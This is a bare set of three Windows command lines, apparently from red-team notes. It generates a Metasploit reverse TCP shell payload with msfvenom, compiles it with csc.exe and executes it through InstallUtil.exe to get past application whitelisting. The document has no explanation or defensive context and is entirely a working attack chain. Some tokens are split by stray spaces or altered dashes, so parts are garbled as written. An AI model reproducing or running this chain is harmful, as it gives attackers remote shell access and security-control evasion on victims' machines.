
```
msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=775 ‐ f csharp
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.Ente rpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Mic opoor.exe /platform:x64 /unsafe C:\Users\John\Desktop\Micropoor_Csc.cs

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\John\Desktop\Micropoor.exe



```
